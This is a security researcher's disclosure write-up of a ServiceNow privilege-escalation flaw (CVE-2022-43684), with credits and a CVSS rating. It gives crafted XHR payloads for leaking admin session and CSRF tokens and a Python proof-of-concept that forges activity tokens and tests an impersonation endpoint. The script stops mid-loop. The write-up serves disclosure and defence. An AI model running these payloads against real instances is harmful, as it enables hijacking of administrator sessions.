<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://x64.sh/posts/ServiceNow-Insecure-access-control-to-admin/">Original</a>
    <h1>ServiceNow Insecure Access Control to Full Admin Takeover</h1>
    
    <div id="readability-page-1" class="page"><div>
  <h2 id="servicenow-insecure-access-control-leading-to-administrator-account-takeover---cve-2022-43684"><span>ServiceNow Insecure Access Control leading to Administrator Account Takeover - <strong>CVE-2022-43684</strong></span><a href="#servicenow-insecure-access-control-leading-to-administrator-account-takeover---cve-2022-43684"><i></i></a></h2>

<p>In this article, we will discuss a series of vulnerabilities that when exploited in succession, could enable a low-privilege user in ServiceNow to gain unauthorized full administrative access to the ServiceNow instance.</p>

<p>ServiceNow is a cloud-based platform that provides service management software as a service (SaaS). It is used by a millions of companies worldwide, and specializes in IT Service Management (ITSM), IT Operations Management (ITOM), and IT Business Management (ITBM). It allows users to manage incidents, service requests, problems, and changes within the IT infrastructure of a business. It also provides a self-service portal where end users can request IT services and log issues.</p>

<p>While working internally as a security engineer on the offensive security team, we routinely scrutinize the security of third-party platforms that integrate with our systems and processes. This is a crucial step to verify the security of these platforms and prevent potential breaches that could expose our sensitive data. During a recent engagement in mid-2022 our security team was able to exploit a number of vulnerabilities in ServiceNow leading to an effective account takeover to obtain administrative access on the platform as a low privileged user.</p>

<h2 id="table-of-contents"><span>Table of Contents</span><a href="#table-of-contents"><i></i></a></h2>
<ul>
  <li>Exploring the ServiceNow application</li>
  <li>Discovering the XHR request behind ‘Interactive Analysis’</li>
  <li>Enumerating tables using Glide Query Language (GQL)</li>
  <li>Constructing a valid session to escalate privileges to Administrator</li>
  <li>Ending Statement</li>
  <li>Credits</li>
  <li>Disclosure Timeline</li>
</ul>

<h2 id="exploring-the-servicenow-application"><span>Exploring the ServiceNow application</span><a href="#exploring-the-servicenow-application"><i></i></a></h2>

<p>While exploring the ServiceNow application, we determined that the application uses <code>.do</code> pages. <code>.do</code> endpoints are often associated with Java servlets, which are used to process requests and return dynamic content. As these pages query server-side resources, it should be secured against unauthorized or unintended access to prevent users from gaining access to sensitive functionality.</p>

<p>ServiceNow also uses Xml Http Requests (XHR), which is a fundamental technology behind Asynchronous JavaScript and XML (AJAX). The use of these API calls are to allow the performance of various operations without needing a full refresh of the page, which can improve the usability and efficiency of the application. ServiceNow widely uses XHR requests to update records or interacting with certain server-side resources or ‘processors’.</p>

<p>The application also uses the Glide Query Language (GQL), which is an proprietary, object-oriented language that forms the basis for the ServiceNow API to perform CRUD operations on its database. In essence, GQL serves as an abstraction layer for SQL operations that allows developers to perform database operations without interacting with raw SQL.</p>

<p>As a low privilege user, we discovered that it was not possible to directly access many of the application’s functionalities. An example is shown below, where we attempted to view the <code>$interactive_analysis.do</code> page:</p>

<p><img width="872" alt="image" data-src="/assets/images/ServiceNow_Images/interactive_do.png" data-proofer-ignore=""/></p>

<p>However, while navigating through the application, there are some locations that inadventently redirect us to sensitive pages by appending query strings needed to create a valid request. Due to insufficient access control being implemented, we discovered that a standard user could access the <code>$interactive_analysis.do</code> endpoint if the query string was correctly formatted. We can send the following request to successfully access the <code>$interactive_analysis.do</code> page:</p>

<pre><code>https://somehost.service-now.com/$interactive_analysis.do?sysparm_field=password&amp;sysparm_table=sys_user&amp;sysparm_from_list=true&amp;sysparm_query=active%3Dtrue%5Ecaller_id%3Djavascript:gs.getUserID()&amp;sysparm_list_view=&amp;sysparm_tiny_url=f040a8971ba38150d88b624c274bcbb3  
</code></pre>

<p>This is shown below:</p>

<p><img width="967" alt="image" data-src="/assets/images/ServiceNow_Images/chart_do.png" data-proofer-ignore=""/></p>

<p>This is a very interesting functionality, because at first glance it provides the low privilege user with a graphical representation of all the users that are within the application, which could potentially signal that potentially sensitive information is being retrieved through some database.</p>

<h2 id="discovering-the-xhr-request-behind-interactive-analysis"><span>Discovering the XHR request behind ‘Interactive Analysis</span><a href="#discovering-the-xhr-request-behind-interactive-analysis"><i></i></a></h2>

<p>Through further investigation, we determined that the <code>$interactive_analysis.do</code> page, as well as the corresponding <code>report_viewer.do</code> (by accessing the chart from a separate page), sends an XHR request to <code>xmlhttp.do</code> with the “ChartDataProcessor” processor in the POST request. The initial output is quite complex, however it is possible to decode/trim the request and simplify it to the following POST body:</p>

<div><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>sysparm_request_params={&#34;page_num&#34;:&#34;0&#34;,&#34;series&#34;:[{&#34;table&#34;:&#34;sys_user&#34;,&#34;groupby&#34;:&#34;name&#34;,&#34;filter&#34;:&#34;&#34;,&#34;plot_type&#34;:&#34;horizontal_bar&#34;}]}&amp;sysparm_processor=ChartDataProcessor 
</pre></td></tr></tbody></table></code></p></div>

<h2 id="enumerating-tables-using-glide-query-language-gql"><span>Enumerating tables using Glide Query Language (GQL)</span><a href="#enumerating-tables-using-glide-query-language-gql"><i></i></a></h2>

<p>We identified that ServiceNow sent an XHR request to <code>xmlhttp.do</code> with the “ChartDataProcessor” processor in a GQL format. As previously mentioned, Glide Query Language is a language that is specifically used for ServiceNow, and the processors were scripts that run server-side that can be called through the XHR request. It is similar to SQL in the format structure sent in the POST request.</p>

<p>We identifed that the following parameters are of interest:</p>

<ul>
  <li><code>table</code>: The specific database table used by the application.</li>
  <li><code>groupby</code>: Retrieves the rows from the specified column. This only retrieves the first 10 values used for rendering the chart/graph, however we can modify the “page_num” to enumerate all the values.</li>
  <li><code>filter</code>: Filtering the results retrieved from the GQL query.</li>
</ul>

<p>Leveraging this access control issue we enumerated a number of databases using Burp Suite Intruder and online documentation used by developers of ServiceNow third party plugins. This section of the test required a lot of trial and error to identify potentially useful tables, as there were hundreds of different tables containing varying degrees of sensitive data. We identified that the following tables were particularly interesting for a threat actor:</p>

<ul>
  <li><code>sys_db_object</code>: Retrieves the complete list of tables used by the application.</li>
  <li><code>sys_user</code>: List of all users</li>
  <li><code>sys_emails</code>: List of all emails</li>
</ul>

<p>According to the documentation, to be able to view ServiceNow tables we need to have read access to at least the ServiceNow tables <code>sys_db_object</code>, <code>sys_dictionary</code>, and <code>sys_glide_object</code>, and in addition to that to the tables you want to view, including referenced tables. However we were not allowed to access certain fields such as the <code>user_password</code> column in the <code>sys_user</code> table, as this would be an easy method to obtain privilege escalation against the system. Through further enumeration however, we were able to find two additional interesting tables, which will prove to be extremely useful later on:</p>

<ul>
  <li><code>sys_user_session</code>: Retrieves the “glide_session_store” and “X-Usertoken” used by any account.</li>
  <li><code>sys_user_token</code>: Partially retrieves the “glide_user_activity” value.</li>
</ul>

<h2 id="constructing-a-valid-session-to-escalate-privileges-to-administrator"><span>Constructing a valid session to escalate privileges to Administrator</span><a href="#constructing-a-valid-session-to-escalate-privileges-to-administrator"><i></i></a></h2>

<p>When testing the application and enumerating the database using the GQL language, we also noted that a valid authenticated session requires the following cookies/headers:</p>

<ul>
  <li>First method: The <code>glide_user_activity</code> and <code>glide_session_store</code> cookies, and the <code>X-Usertoken</code> header to be correctly set, OR</li>
  <li>Second method: The <code>JSESSIONID</code> cookie and the <code>X-Usertoken</code> header to be correctly set.</li>
</ul>

<p>As it was possible to leak the tables we assumed that <code>sys_user_session</code> and <code>sys_user_token</code> would be all we needed to steal other accounts. While this was true there proved to be more nuance that made it more difficult to exploit.</p>

<p>The second method initially stood out since the knowledge of a <code>JSESSIONID</code> cookie and the <code>X-Usertoken</code> header would lead to an effective account takeover of any logged in administator user. Ultimately, we were unable to obtain the <code>JSESSIONID</code> from any table, however it may be possible to leverage XSS/CSRF for a successful account takeover, but this was never attempted because we were able to retrieve a valid pathway to exploitation using the first method. The steps are outlined as follows:</p>

<p>Firstly, we can use the following query to retrieve the <code>glide_session_store</code>, which is used to store session information for users. Each record represents a unique session for each user, as well as other related information:</p>

<div><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>sysparm_request_params={&#34;page_num&#34;:&#34;0&#34;,&#34;series&#34;:[{&#34;table&#34;:&#34;sys_user_session&#34;,&#34;groupby&#34;:&#34;id&#34;,&#34;filter&#34;:&#34;nameCONTAINS[Insert_Admin_Email_Here]^invalidatedISNULL&#34;,&#34;plot_type&#34;:&#34;horizontal_bar&#34;}]}&amp;sysparm_processor=ChartDataProcessor 
</pre></td></tr></tbody></table></code></p></div>

<p>Note that the results are filtered by the name of the target user, which we can enumerate using the <code>sys_user</code> table - this can also help us determine who the administrators of the instance are. The <code>^invalidatedISNULL</code> removes all the invalidated or expired tokens.</p>

<p>Secondly, we need to retrieve the <code>X-Usertoken</code> value from the <code>sys_user_session</code> table, which is the CSRF token that the application provides users to ensure that requests made are genuine and not malicious. We require this token to make subsequent requests to the server.</p>

<div><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>sysparm_request_params={&#34;page_num&#34;:&#34;0&#34;,&#34;series&#34;:[{&#34;table&#34;:&#34;sys_user_session&#34;,&#34;groupby&#34;:&#34;csrf_token&#34;,&#34;filter&#34;:&#34;nameCONTAINS[Insert_Admin_Email_Here]^invalidatedISNULL&#34;,&#34;plot_type&#34;:&#34;horizontal_bar&#34;}]}&amp;sysparm_processor=ChartDataProcessor 
</pre></td></tr></tbody></table></code></p></div>

<p>The most difficult aspect was to determine a valid <code>glide_user_activity</code> token. A standard <code>glide_user_activity</code> token looks like this:</p>

<div><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>U0N2M18xOmV4VFozT2Eyb2p0OVVWcXY5WktIeUl2L2h5MjFBMlY1d3RnRWkrUVpkZnM9Ok9NNzFIRDV1S0ZBMy90L1plMW5oQXk0OWliYVdBMXFlZUc5cmE3aGdPQ1E9
</pre></td></tr></tbody></table></code></p></div>

<p>We can make the following request to retrieve the partial token from the database:</p>

<div><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>sysparm_request_params={&#34;page_num&#34;:&#34;0&#34;,&#34;series&#34;:[{&#34;table&#34;:&#34;sys_user_token&#34;,&#34;groupby&#34;:&#34;token&#34;,&#34;filter&#34;:&#34;nameCONTAINS[Insert_Admin_Email_Here]&#34;,&#34;plot_type&#34;:&#34;horizontal_bar&#34;}]}&amp;sysparm_processor=ChartDataProcessor 
</pre></td></tr></tbody></table></code></p></div>

<p>However the values that were retrieved from <code>sys_user_token</code> appeared as follows:</p>

<p><img width="967" alt="image" data-src="/assets/images/ServiceNow_Images/jwt_error.png" data-proofer-ignore=""/></p>

<p>Each <code>glide_user_activity</code> token could be base64 decoded however, revealing that the value from <code>sys_user_token</code> was the first half of the token:</p>

<p><img width="967" alt="image" data-src="/assets/images/ServiceNow_Images/jwt_decode.png" data-proofer-ignore=""/></p>

<p>Through trial and error, we determined that the signature section of the token was not sufficiently validated when sent to the server, and it was possible to simply replace or remove the second half of the token to create a valid token.</p>

<p>With all three requirements satisfied, it was then possible to takeover any account including administrative accounts with an active session on the ServiceNow instance. ServiceNow also implements impersonation to allow admin to login into any user account for debugging purposes, we were able to use the admin account to impersonate a spefical user admin account and grant our account admin privileges on the ServiceNow instance.</p>

<h2 id="ending-statement"><span>Ending Statement</span><a href="#ending-statement"><i></i></a></h2>

<p>Overall, we were able to leverage several vulnerabilities to escalate privileges from a standard user account to administrator of the ServiceNow instance. The following vulnerabilities allowed us to gain effective account takeover:</p>
<ul>
  <li>Insecure access control in the “ChartDataProcessor” processor</li>
  <li>Overly permissive read access to sensitive tables in ServiceNow database</li>
  <li>Insufficient signature validation of the <code>glide_user_activity</code> token</li>
</ul>

<p>While the root cause of the issue was due to a insecure access control, the other vulnerabilties discovered and chained together took a medium impact bug to a critical impact bug with a CVSS score of <em><code>9.9 - https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H&amp;version=3.1</code></em></p>

<h2 id="credits"><span>Credits</span><a href="#credits"><i></i></a></h2>

<p>The multiple vulnerabilities leading to full compromise of the ServiceNow instance were discovered by Luke Symons, Tony Wu, Eldar Marcussen, Gareth Phillips, Jeff Thomas, Nadeem Salim, and Stephen Bradshaw.</p>

<h2 id="proof-of-concept"><span>Proof of Concept</span><a href="#proof-of-concept"><i></i></a></h2>
<div><p><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
</pre></td><td><pre><span>import</span> <span>base64</span>
<span>import</span> <span>requests</span>
<span>import</span> <span>argparse</span>
<span>import</span> <span>requests</span>
<span>import</span> <span>bs4</span>
<span>import</span> <span>json</span>
<span>import</span> <span>urllib3</span>
<span>import</span> <span>argparse</span>
<span>import</span> <span>xml.etree.ElementTree</span> <span>as</span> <span>ET</span>

<span>urllib3</span><span>.</span><span>disable_warnings</span><span>(</span><span>urllib3</span><span>.</span><span>exceptions</span><span>.</span><span>InsecureRequestWarning</span><span>)</span>

<span>proxies</span> <span>=</span> <span>{</span><span>&#34;http&#34;</span><span>:</span> <span>&#34;http://127.0.0.1:8080&#34;</span><span>,</span> <span>&#34;https&#34;</span><span>:</span> <span>&#34;http://127.0.0.1:8080&#34;</span><span>}</span>


<span>def</span> <span>banner</span><span>():</span>
    <span>banner</span> <span>=</span> <span>&#39;&#39;&#39;

                ..ooo@@@XXX%%%xx..
            .oo@@XXX%x%xxx..     ` .
          .o@XX%%xx..               ` .
        o@X%..                  ..ooooooo
      .@X%x.                 ..o@@^^   ^^@@o
    .ooo@@@@@@ooo..      ..o@@^          @X%
    o@@^^^     ^^^@@@ooo.oo@@^             %
   xzI    -*--      ^^^o^^        --*-     %
   @@@o     ooooooo^@@^o^@X^@oooooo     .X%x
  I@@@@@@@@@XX%%xx  ( o@o )X%x@ROMBASED@@@X%x
  I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x
   @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x
    ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx
          o@@^^^ooo I^^ I^o ooo   .  x
          oo @^ IX      I   ^X  @^ oo
          IX     U  .        V     IX
           V     .           .     V  

   .-~*´¨¯¨`*·~-.,-(Account Now)-,.-~*´¨¯¨`*·~-. 
       Privilege Escalation by Rezk0n and WucciSec
       greets to Wireghoul, GmP, punk_fairybread, &amp; d4rkt1d3 
      &#39;&#39;&#39;</span>
    <span>print</span><span>(</span><span>banner</span><span>)</span>


<span>target</span> <span>=</span> <span>&#34;https://&lt;ServiceNow_Instance&gt;:443/xmlhttp.do&#34;</span>
<span>cookies</span> <span>=</span> <span>{</span><span>&#34;BIGipServerpool_&lt;instancename&gt;&#34;</span><span>:</span> <span>&#34;&#34;</span><span>,</span> <span>&#34;JSESSIONID&#34;</span><span>:</span> <span>&#34;&#34;</span><span>,</span> <span>&#34;__CJ_g_startTime&#34;</span><span>:</span> <span>&#34;%%22&#34;</span><span>,</span> <span>&#34;glide_mfa_remembered_browser&#34;</span><span>:</span> <span>&#34;&#34;</span><span>,</span> <span>&#34;glide_session_store&#34;</span><span>:</span> <span>&#34;&#34;</span><span>,</span> <span>&#34;glide_user_activity&#34;</span><span>:</span> <span>&#34;&#34;</span><span>,</span> <span>&#34;glide_user_route&#34;</span><span>:</span> <span>&#34;&#34;</span><span>}</span>
<span>headers</span> <span>=</span> <span>{</span><span>&#34;User-Agent&#34;</span><span>:</span> <span>&#34;&#34;</span><span>,</span> <span>&#34;Accept-Encoding&#34;</span><span>:</span> <span>&#34;gzip, deflate&#34;</span><span>,</span> <span>&#34;Accept&#34;</span><span>:</span> <span>&#34;*/*&#34;</span><span>,</span> <span>&#34;Connection&#34;</span><span>:</span> <span>&#34;close&#34;</span><span>,</span> <span>&#34;X-Usertoken&#34;</span><span>:</span> <span>&#34;&#34;</span><span>,</span> <span>&#34;Origin&#34;</span><span>:</span> <span>&#34;&#34;</span><span>,</span> <span>&#34;Sec-Fetch-Dest&#34;</span><span>:</span> <span>&#34;empty&#34;</span><span>,</span> <span>&#34;Sec-Fetch-Mode&#34;</span><span>:</span> <span>&#34;cors&#34;</span><span>,</span> <span>&#34;Sec-Fetch-Site&#34;</span><span>:</span> <span>&#34;same-origin&#34;</span><span>,</span> <span>&#34;Referer&#34;</span><span>:</span> <span>&#34;&#34;</span><span>,</span> <span>&#34;Te&#34;</span><span>:</span> <span>&#34;trailers&#34;</span><span>,</span> <span>&#34;Content-Type&#34;</span><span>:</span> <span>&#34;application/x-www-form-urlencoded&#34;</span><span>}</span>



<span>def</span> <span>get_users</span><span>(</span><span>xrange</span><span>):</span>
    <span>session</span> <span>=</span> <span>requests</span><span>.</span><span>session</span><span>()</span>
    <span>post_data</span> <span>=</span> <span>&#39;{&#34;page_num&#34;:&#34;%s&#34;,&#34;series&#34;:[{&#34;table&#34;: &#34;sys_user&#34;,&#34;groupby&#34;:&#34;user_name&#34;,&#39;</span> \
                    <span>&#39;&#34;filter&#34;:&#34;&#34;,&#34;plot_type&#34;:&#34;horizontal_bar&#34;}]}&#39;</span> <span>%</span> <span>(</span><span>xrange</span><span>)</span>
    <span>payload</span> <span>=</span> <span>{</span><span>&#34;sysparm_request_params&#34;</span><span>:</span> <span>post_data</span><span>,</span> <span>&#34;sysparm_processor&#34;</span><span>:</span> <span>&#34;ChartDataProcessor&#34;</span><span>}</span>
    <span>json_response</span> <span>=</span> <span>session</span><span>.</span><span>post</span><span>(</span><span>target</span><span>,</span> <span>headers</span><span>=</span><span>headers</span><span>,</span> <span>cookies</span><span>=</span><span>cookies</span><span>,</span> <span>data</span><span>=</span><span>payload</span><span>,</span>
                                     <span>proxies</span><span>=</span><span>proxies</span><span>,</span> <span>verify</span><span>=</span><span>False</span><span>)</span>
    <span>tree</span> <span>=</span> <span>ET</span><span>.</span><span>fromstring</span><span>(</span><span>json_response</span><span>.</span><span>text</span><span>)</span>
    <span>notags</span> <span>=</span> <span>ET</span><span>.</span><span>tostring</span><span>(</span><span>tree</span><span>,</span> <span>encoding</span><span>=</span><span>&#39;utf8&#39;</span><span>,</span> <span>method</span><span>=</span><span>&#39;text&#39;</span><span>)</span>
    <span>json_data</span> <span>=</span> <span>json</span><span>.</span><span>loads</span><span>(</span><span>notags</span><span>)</span>
    <span>a</span> <span>=</span> <span>json_data</span><span>[</span><span>&#39;CHART_DATA&#39;</span><span>]</span>
    <span>b</span> <span>=</span> <span>json</span><span>.</span><span>loads</span><span>(</span><span>a</span><span>)[</span><span>&#39;series&#39;</span><span>]</span>
    <span>for</span> <span>i</span> <span>in</span> <span>b</span><span>:</span>
        <span>arr</span> <span>=</span> <span>i</span><span>[</span><span>&#39;aggregate_query&#39;</span><span>]</span>
        <span>c</span> <span>=</span> <span>i</span><span>[</span><span>&#39;aggregate_query&#39;</span><span>]</span>
        <span>print</span><span>(</span><span>c</span><span>)</span>
        <span>if</span> <span>len</span><span>(</span><span>c</span><span>)</span> <span>==</span> <span>0</span><span>:</span>
            <span>exit</span><span>(</span><span>1</span><span>)</span>




<span>def</span> <span>retrieve_tokens</span><span>(</span><span>table</span><span>,</span> <span>groupby</span><span>,</span> <span>name</span><span>,</span> <span>admin_filter</span><span>):</span>
    <span>session</span> <span>=</span> <span>requests</span><span>.</span><span>session</span><span>()</span>
    <span>if</span> <span>not</span> <span>admin_filter</span><span>:</span>
        <span>post_data</span> <span>=</span> <span>&#39;{&#34;page_num&#34;:&#34;0&#34;,&#34;series&#34;:[{&#34;table&#34;: &#34;%s&#34;,&#34;groupby&#34;:&#34;%s&#34;,&#39;</span> \
                    <span>&#39;&#34;filter&#34;:&#34;nameCONTAINS%s&#34;,&#34;plot_type&#34;:&#34;horizontal_bar&#34;}]}&#39;</span> <span>%</span> <span>(</span><span>table</span><span>,</span> <span>groupby</span><span>,</span> <span>name</span><span>)</span>
    <span>else</span><span>:</span>
        <span>post_data</span> <span>=</span> <span>&#39;{&#34;page_num&#34;:&#34;0&#34;,&#34;series&#34;:[{&#34;table&#34;: &#34;%s&#34;,&#34;groupby&#34;:&#34;%s&#34;,&#39;</span> \
               <span>&#39;&#34;filter&#34;:&#34;nameCONTAINS%s^invalidatedISNULL&#34;,&#34;plot_type&#34;:&#34;horizontal_bar&#34;}]}&#39;</span> <span>%</span> <span>(</span>
                   <span>table</span><span>,</span> <span>groupby</span><span>,</span> <span>name</span><span>)</span>
    <span>payload</span> <span>=</span> <span>{</span>
        <span>&#34;sysparm_request_params&#34;</span><span>:</span> <span>post_data</span><span>,</span> <span>&#34;sysparm_processor&#34;</span><span>:</span> <span>&#34;ChartDataProcessor&#34;</span><span>}</span>
    <span>json_response</span> <span>=</span> <span>session</span><span>.</span><span>post</span><span>(</span><span>target</span><span>,</span> <span>headers</span><span>=</span><span>headers</span><span>,</span> <span>cookies</span><span>=</span><span>cookies</span><span>,</span> <span>data</span><span>=</span><span>payload</span><span>,</span>
                                 <span>proxies</span><span>=</span><span>proxies</span><span>,</span> <span>verify</span><span>=</span><span>False</span><span>)</span>
    <span>tree</span> <span>=</span> <span>ET</span><span>.</span><span>fromstring</span><span>(</span><span>json_response</span><span>.</span><span>text</span><span>)</span>
    <span>notags</span> <span>=</span> <span>ET</span><span>.</span><span>tostring</span><span>(</span><span>tree</span><span>,</span> <span>encoding</span><span>=</span><span>&#39;utf8&#39;</span><span>,</span> <span>method</span><span>=</span><span>&#39;text&#39;</span><span>)</span>
    <span>json_data</span> <span>=</span> <span>json</span><span>.</span><span>loads</span><span>(</span><span>notags</span><span>)</span>
    <span>a</span> <span>=</span> <span>json_data</span><span>[</span><span>&#39;CHART_DATA&#39;</span><span>]</span>
    <span>b</span> <span>=</span> <span>json</span><span>.</span><span>loads</span><span>(</span><span>a</span><span>)[</span><span>&#39;series&#39;</span><span>]</span>
    <span>for</span> <span>i</span> <span>in</span> <span>b</span><span>:</span>
        <span>arr</span> <span>=</span> <span>i</span><span>[</span><span>&#39;aggregate_query&#39;</span><span>]</span>
        <span>c</span> <span>=</span> <span>i</span><span>[</span><span>&#39;aggregate_query&#39;</span><span>][</span><span>0</span><span>]</span>
    <span>if</span> <span>not</span> <span>admin_filter</span><span>:</span>
        <span>base64_bytes_arr</span> <span>=</span> <span>[]</span>
        <span>num</span> <span>=</span> <span>0</span>
        <span>for</span> <span>val</span> <span>in</span> <span>arr</span><span>:</span>
            <span>try</span><span>:</span>
                <span>token</span> <span>=</span> <span>arr</span><span>[</span><span>num</span><span>].</span><span>strip</span><span>(</span><span>&#39;token=&#39;</span><span>)</span>
                <span>token_format</span> <span>=</span> <span>&#34;SCv3_1:{}=:{}&#34;</span><span>.</span><span>format</span><span>(</span><span>token</span><span>,</span> <span>&#34;AAAA&#34;</span><span>)</span>
                <span>encoded_token</span> <span>=</span> <span>token_format</span><span>.</span><span>encode</span><span>(</span><span>&#39;ascii&#39;</span><span>)</span>
                <span>base64_bytes</span> <span>=</span> <span>base64</span><span>.</span><span>b64encode</span><span>(</span><span>encoded_token</span><span>)</span>
                <span>base64_bytes_arr</span><span>.</span><span>append</span><span>(</span><span>base64_bytes</span><span>)</span>
            <span>except</span> <span>Exception</span> <span>as</span> <span>err</span><span>:</span>
                <span>#print(err)
</span>                <span>print</span><span>(</span><span>&#34;No Active Session, we cant steal anything!! :(&#34;</span><span>)</span>
                <span>exit</span><span>(</span><span>1</span><span>)</span>
            <span>num</span> <span>=</span> <span>num</span> <span>+</span> <span>1</span>
        <span>return</span> <span>base64_bytes_arr</span>
    <span>else</span><span>:</span>
        <span>try</span><span>:</span>
            <span>return</span> <span>arr</span>
        <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
            <span>print</span><span>(</span><span>&#34;No Vaild Sessions&#34;</span><span>)</span>
            <span>exit</span><span>(</span><span>1</span><span>);</span>


<span>def</span> <span>validation</span><span>(</span><span>sess</span><span>,</span> <span>user</span><span>,</span> <span>activity</span><span>):</span>
    <span>session</span> <span>=</span> <span>requests</span><span>.</span><span>session</span><span>()</span>
    <span>validation_endpoint</span> <span>=</span> <span>&#34;https://&lt;ServiceNowInstance&gt;/api/now/ui/impersonate/role&#34;</span>
    <span>validation_cookies</span> <span>=</span> <span>{</span>
        <span>&#34;glide_user_activity&#34;</span><span>:</span> <span>activity</span><span>,</span>
        <span>&#34;glide_session_store&#34;</span><span>:</span> <span>sess</span>
    <span>}</span>
    <span>validation_headers</span> <span>=</span> <span>{</span><span>&#34;X-Usertoken&#34;</span><span>:</span> <span>user</span><span>,</span>
               <span>&#34;Origin&#34;</span><span>:</span> <span>&#34;https://&lt;serviceNowInstance&gt;&#34;</span><span>,</span> <span>&#34;Content-Type&#34;</span><span>:</span> <span>&#34;application/json;charset=utf-8&#34;</span>
    <span>}</span>
    <span>payload</span> <span>=</span> <span>{</span><span>&#34;role&#34;</span><span>:</span><span>&#34;&#34;</span><span>}</span>
    <span>json_response</span> <span>=</span> <span>session</span><span>.</span><span>post</span><span>(</span><span>validation_endpoint</span><span>,</span> <span>headers</span><span>=</span><span>validation_headers</span><span>,</span> <span>cookies</span><span>=</span><span>validation_cookies</span><span>,</span> <span>json</span><span>=</span><span>payload</span><span>,</span>
                                 <span>proxies</span><span>=</span><span>proxies</span><span>,</span> <span>verify</span><span>=</span><span>False</span><span>)</span>
    <span>return</span> <span>json_response</span><span>.</span><span>status_code</span><span>,</span> <span>json_response</span><span>.</span><span>json</span><span>()</span>


<span>def</span> <span>main</span><span>():</span>
    <span>glide_session_stores_arr</span> <span>=</span> <span>[]</span>
    <span>usertoken_arr</span> <span>=</span> <span>[]</span>
    <span>glide_user_activity_arr</span> <span>=</span> <span>[]</span>
    <span>try</span><span>:</span>
        <span>glide_session_stores_arr</span> <span>=</span> <span>retrieve_tokens</span><span>(</span><span>&#39;sys_user_session&#39;</span><span>,</span> <span>&#39;id&#39;</span><span>,</span> <span>args</span><span>.</span><span>n</span><span>,</span> <span>True</span><span>)</span>
        <span>usertoken_arr</span> <span>=</span> <span>retrieve_tokens</span><span>(</span><span>&#39;sys_user_session&#39;</span><span>,</span> <span>&#39;csrf_token&#39;</span><span>,</span> <span>args</span><span>.</span><span>n</span><span>,</span> <span>True</span><span>)</span>
        <span>glide_user_activity_arr</span> <span>=</span> <span>retrieve_tokens</span><span>(</span><span>&#39;sys_user_token&#39;</span><span>,</span> <span>&#39;token&#39;</span><span>,</span> <span>args</span><span>.</span><span>n</span><span>,</span> <span>False</span><span>)</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>print</span><span>(</span><span>&#34;No valid session with that user..:(</span><span>\n</span><span>&#34;</span><span>)</span>
        <span>exit</span><span>(</span><span>1</span><span>)</span>

    <span>print</span><span>(</span><span>&#34;Testing access to the /api/now/ui/impersonate/role endpoint&#34;</span><span>)</span>
    <span>is_valid</span> <span>=</span> <span>False</span>
    <span>for</span> <span>glide_session_stores</span> <span>in</span> <span>glide_session_stores_arr</span><span>:</span>
        <span>for</span> <span>usertoken</span> <span>in</span> <span>usertoken_arr</span><span>:</span>
            <span>for</span> <span>glide_user_activity</span> <span>in</span> <span>glide_user_activity_arr</span><span>:</span>
                <span>if</span> <span>is_valid</span><span>:</span>
                    <span>break</span>
                <span>try</span><span>:</span>
                    <span>session_token</span> <span>=</span> <span>glide_session_stores</span><span>.</span><span>strip</span><span>(</span><span>&#34;id=&#34;</span><span>)</span>
                    <span>user_token</span> <span>=</span> <span>usertoken</span><span>[</span><span>11</span><span>:]</span>
                    <span>activity_token</span> <span>=</span> <span>glide_user_activity</span><span>.</span><span>decode</span><span>(</span><span>&#39;ascii&#39;</span><span>)</span>

                    <span>status_code</span><span>,</span> <span>response</span> <span>=</span> <span>validation</span><span>(</span><span>session_token</span><span>,</span> <span>user_token</span><span>,</span> <span>activity_token</span><span>)</span>
                    <span>if</span> <span>status_code</span> <span>==</span> <span>201</span><span>:</span>
                        <span>print</span><span>(</span><span>&#34;Success! Potential Administrator Credentials!&#34;</span><span>)</span>
                        <span>print</span><span>(</span><span>&#34;</span><span>\t</span><span>glide_session_stores: &#34;</span> <span>+</span> <span>str</span><span>(</span><span>session_token</span><span>))</span>
                        <span>print</span><span>(</span><span>&#34;</span><span>\t</span><span>X-Usertoken: &#34;</span> <span>+</span> <span>str</span><span>(</span><span>user_token</span><span>))</span>
                        <span>print</span><span>(</span><span>&#34;</span><span>\t</span><span>glide_user_activity: &#34;</span> <span>+</span> <span>str</span><span>(</span><span>activity_token</span><span>))</span>
                        <span>print</span><span>(</span><span>&#34;</span><span>\n</span><span>&#34;</span><span>)</span>
                        <span>active_roles</span> <span>=</span> <span>response</span><span>[</span><span>&#39;result&#39;</span><span>][</span><span>&#39;activeRoles&#39;</span><span>]</span>
                        <span>print</span><span>(</span><span>&#34;</span><span>\t</span><span>Active Roles: &#34;</span> <span>+</span> <span>str</span><span>(</span><span>active_roles</span><span>))</span>
                        <span>is_valid</span> <span>=</span> <span>True</span>
                    <span>else</span><span>:</span>
                        <span>print</span><span>(</span><span>&#34;.&#34;</span><span>,)</span>
